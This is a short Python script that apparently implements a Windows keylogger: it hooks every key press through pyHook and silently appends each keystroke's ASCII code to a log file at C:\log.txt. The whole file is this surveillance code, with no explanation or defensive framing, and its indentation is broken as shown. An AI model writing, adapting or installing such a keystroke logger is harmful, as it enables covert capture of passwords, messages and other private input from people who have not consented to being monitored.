import pyHook,pythoncom,sys ,logging
file_log = 'C:\\log.txt'
def OnKeyboardEvent(event):

logging.basicConfig(filename = file_log,level = logging.DEBUG,format = '%(message)s')

str(event.Ascii)

logging.log(10,str(event.Ascii))

return True
hooks_manager = pyHook.HookManager()

hooks_manager.KeyDown = OnKeyboardEvent

hooks_manager.HookKeyboard()

pythoncom.PumpMessages()
